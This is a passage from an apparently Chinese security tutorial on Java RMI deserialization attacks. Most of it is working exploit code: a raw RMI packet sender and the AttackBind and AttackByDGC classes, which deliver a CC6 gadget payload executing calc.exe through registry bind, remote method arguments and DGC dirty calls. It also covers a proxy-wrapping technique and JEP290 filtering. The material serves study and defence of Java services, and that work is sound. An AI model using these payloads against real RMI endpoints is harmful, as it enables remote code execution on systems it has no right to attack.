class="token punctuation">,</span> <span class="token class-name">Long</span> hash<span class="token punctuation">,</span> <span class="token class-name">Object</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>objects<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token class-name">SocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createSocket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
        socket<span class="token punctuation">.</span><span class="token function">setKeepAlive</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        socket<span class="token punctuation">.</span><span class="token function">setTcpNoDelay</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">DataOutputStream</span> dos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">OutputStream</span> os <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">;</span>

            dos<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span><span class="token class-name">TransportConstants<span class="token punctuation">.</span>Magic</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dos<span class="token punctuation">.</span><span class="token function">writeShort</span><span class="token punctuation">(</span><span class="token class-name">TransportConstants<span class="token punctuation">.</span>Version</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dos<span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">TransportConstants<span class="token punctuation">.</span>SingleOpProtocol</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            dos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">TransportConstants<span class="token punctuation">.</span>Call</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">final</span> <span class="token class-name">ObjectOutputStream</span> objOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MarshalOutputStream</span><span class="token punctuation">(</span>dos<span class="token punctuation">)</span><span class="token punctuation">;</span>

            objid<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>objOut<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Objid</span>
            objOut<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>opNum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// opnum</span>
            objOut<span class="token punctuation">.</span><span class="token function">writeLong</span><span class="token punctuation">(</span>hash<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hash</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> object<span class="token operator">:</span>
                 objects<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                objOut<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            os<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>dos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                dos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>socket <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">enableCustomRMIClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">RMIRegistryEndpoint</span> rmiRegistry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIRegistryEndpoint</span><span class="token punctuation">(</span><span class="token string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token number">21099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//还记得遍历攻击里我们实现的无依赖获取远程对象存根吗，这里直接套用了。</span>
            <span class="token class-name">RemoteObjectWrapper</span> remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectWrapper</span><span class="token punctuation">(</span>rmiRegistry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;math&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;math&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> payloadObj <span class="token operator">=</span> <span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//methodSignature 可以通过javap -s 类名计算</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> methodSignature <span class="token operator">=</span> <span class="token string">&quot;add(Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;&quot;</span><span class="token punctuation">;</span>
            <span class="token comment">//这里直接扒了rmi对应的源码</span>
            <span class="token class-name">Long</span> methodHash <span class="token operator">=</span> <span class="token class-name">RemoteUtils</span><span class="token punctuation">.</span><span class="token function">computeMethodHash</span><span class="token punctuation">(</span>methodSignature<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">sendRawCall</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>remoteObj<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>remoteObj<span class="token punctuation">.</span>objID<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>methodHash<span class="token punctuation">,</span>payloadObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span>
            t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br></div></div><p>效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_19ef802ff21262745c6a7e2b13ae4c14.png" alt=""></p> <p>原理简单来说就是当远程函数的参数不是基本类型时（在jdk8u242后如果参数类型是String也不会调用），反序列化参数输入流会调用readObject导致反序列化攻击。</p> <p>值得一提的是在跟进unmarshalParameters的过程中，发现远程对象如果实现了DeserializationChecker,则在反序列化的过程中会调用对应方法对序列化数据进行检查</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">private</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">unmarshalParameters</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token class-name">Method</span> var2<span class="token punctuation">,</span> <span class="token class-name">MarshalInputStream</span> var3<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> var1 <span class="token keyword">instanceof</span> <span class="token class-name">DeserializationChecker</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParametersChecked</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">DeserializationChecker</span><span class="token punctuation">)</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParametersUnchecked</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="远程方法参数反序列化2-注册中心registry提供的远程方法"><a href="#远程方法参数反序列化2-注册中心registry提供的远程方法" class="header-anchor">#</a> 远程方法参数反序列化2 （注册中心Registry提供的远程方法）</h3> <p>既然调用远程方法传递参数会导致反序列化，注意到Registry本身就是一个远程对象，那么我们在调用Registry方法的时候，会不会触发反序列化呢。</p> <p>以bind函数为例</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span>Registry</span>#bind
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">bind</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Remote</span> obj<span class="token punctuation">)</span>
        <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span><span class="token punctuation">,</span> <span class="token class-name">AccessException</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>就符合我们之前对方法的要求，name和obj参数都可能存在反序列化点。</p> <p>当在远程调用bind函数时,在JEP290出现之前(jdk版本低于<code>6u141</code>, <code>7u131</code>,<code>8u121</code>)服务端对应的代码如下</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token number">4905912898345647071L</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SkeletonMismatchException</span><span class="token punctuation">(</span><span class="token string">&quot;interface hash mismatch&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>
	<span class="token keyword">try</span> <span class="token punctuation">{</span>
		var11 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//var7是bound name</span>
		var7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var11<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">//var8是remote object</span>
		var8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Remote</span><span class="token punctuation">)</span>var11<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var94<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">&quot;error unmarshalling arguments&quot;</span><span class="token punctuation">,</span> var94<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> var95<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">&quot;error unmarshalling arguments&quot;</span><span class="token punctuation">,</span> var95<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
		var2<span class="token punctuation">.</span><span class="token function">releaseInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	var6<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">try</span> <span class="token punctuation">{</span>
		var2<span class="token punctuation">.</span><span class="token function">getResultStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var93<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MarshalException</span><span class="token punctuation">(</span><span class="token string">&quot;error marshalling return&quot;</span><span class="token punctuation">,</span> var93<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>可以发现name和Obj都是直接反序列化的，那么和之前调用Server远程函数一样我们从协议层可以直接构造发包</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttackBind</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">enableCustomRMIClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Object</span> payloadObj <span class="token operator">=</span> <span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">ObjID</span> objID_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//sendRawCall和之前一致 构造bind(obj,null)包</span>
            <span class="token function">sendRawCall</span><span class="token punctuation">(</span><span class="token string">&quot;127.0.0.1&quot;</span><span class="token punctuation">,</span><span class="token number">21099</span><span class="token punctuation">,</span>objID_<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4905912898345647071L</span><span class="token punctuation">,</span>payloadObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span>
            t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>当然用object触发也行</p> <p><img src="https://md.buptmerak.cn/uploads/upload_ffd7f9b87736f2c67589565f66618146.png" alt=""></p> <p>此外，也可以通过代理类的方式包装payloadObject实现remote接口，直接调用bind方法。比较常见的也是ysoserial采用的利用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>代理原来的Obj实现Remote接口的方式，代码如下</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token class-name">Object</span> payload <span class="token operator">=</span> <span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;whatever&quot;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Constructor</span> constructor <span class="token operator">=</span>  <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InvocationHandler</span> invocationHandler  <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Remote</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Remote</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> invocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">&quot;evil&quot;</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><img src="https://md.buptmerak.cn/uploads/upload_b121d23d5bf84379b53bbb7c3d4bdc08.png" alt=""></p> <p>类似的，<code>unbind/lookup/rebind</code>也会出现这也的问题，list因为没有参数所以无法利用</p> <p>但是这些攻击方法在JEP290出现后都失效了,我们切换java版本发现远端服务器拒绝了我们的反序列化请求</p> <p><img src="https://md.buptmerak.cn/uploads/upload_7f2db9ee7b8dbaecef6cdd383db5e986.png" alt=""></p> <blockquote><p>JEP290简单来说就是为了缓解java反序列化安全问题，支持在readObject的过程中添加自定义的过滤规则。通过JEP290，不止在rmi协议中，在其他反序列化场景也可以有效拦截恶意的序列化值。</p></blockquote> <p>在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>处下断点，然后开始调试，可以发现过滤器是在<code>obj.readObject()</code>语句中进入的，直接对反序列化输入流进行检测，就不好绕过了。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>return String.class != var2 
&amp;&amp;!Number.class.isAssignableFrom(var2) 
&amp;&amp; !Remote.class.isAssignableFrom(var2) 
&amp;&amp; !Proxy.class.isAssignableFrom(var2) 
&amp;&amp; !UnicastRef.class.isAssignableFrom(var2) 
&amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) 
&amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) 
&amp;&amp; !ActivationID.class.isAssignableFrom(var2) 
&amp;&amp; !UID.class.isAssignableFrom(var2) 

? Status.REJECTED : Status.ALLOWED;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="远程函数返回值导致的反序列化"><a href="#远程函数返回值导致的反序列化" class="header-anchor">#</a> 远程函数返回值导致的反序列化</h3> <p>这个就很好理解了，远端起一个恶意的rmi服务，返回值就是恶意的序列化值，那么客户端调用结果时就会触发反序列化</p> <p><img src="https://md.buptmerak.cn/uploads/upload_fea837ac1ee60c2659990ca19ee74206.png" alt=""></p> <p>效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_3f9b8f01b58b45d9aee8407c44ca71e9.png" alt=""></p> <p>不过这种攻击手段一般很少提及，不过其实我们想一想，之前在对流量的分析是,进行对远程的操作之前，总会先检查<code>Lease</code>是否存在或过期。如果没有就会先发一个<code>DGC Call</code>去获取一个<code>Lease</code>那么这个Lease如果被我们拦截伪造成一个恶意的序列化结果，不就能通过函数的返回值去触发反序列化了吗。</p> <p>如果我们在之前对RMI过程进行过调试的话，会发现有时候<code>sun.rmi.server.UnicastServerRef#dispatch</code>除了会传入我们使用的远程对象，还会传入一个<code>DGC_Impl</code>的远程对象,这其实就是类似<code>Registry_Impl</code>的一个远程对象。</p> <p>分析对应Skel代码</p> <p><img src="https://md.buptmerak.cn/uploads/upload_6339b61340877cc260a087a63858762d.png" alt=""></p> <p>分析对应代码可以看到可以看到不论是调用远程的clean(case:0)还是dirty（case:1）方法都会涉及到返回结果的反序列化。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_85d75dd438af783808314e04d249f3bc.png" alt=""></p> <p>那么还是一样的，我们直接构造一个Dirty Call请求，就能触发registry的反序列化</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttackByDGC</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> registryHost <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> registryPort <span class="token operator">=</span> <span class="token number">21099</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">Object</span> payloadObject <span class="token operator">=</span> <span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjID</span> objID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RemoteUtils</span><span class="token punctuation">.</span><span class="token function">sendRawCall</span><span class="token punctuation">(</span>registryHost<span class="token punctuation">,</span> registryPort<span class="token punctuation">,</span>  objID<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">669196253586618813L</span><span class="token punctuation">,</span>payloadObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>或者打Server</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttackByDGC</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

        <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">enableCustomRMIClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RMIRegistryEndpoint</span> rmiRegistry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RMIRegistryEndpoint</span><span class="token punctuation">(</span><span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">,</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RemoteObjectWrapper</span> remoteObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectWrapper</span><span class="token punctuation">(</span>rmiRegistry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;math&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;math&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
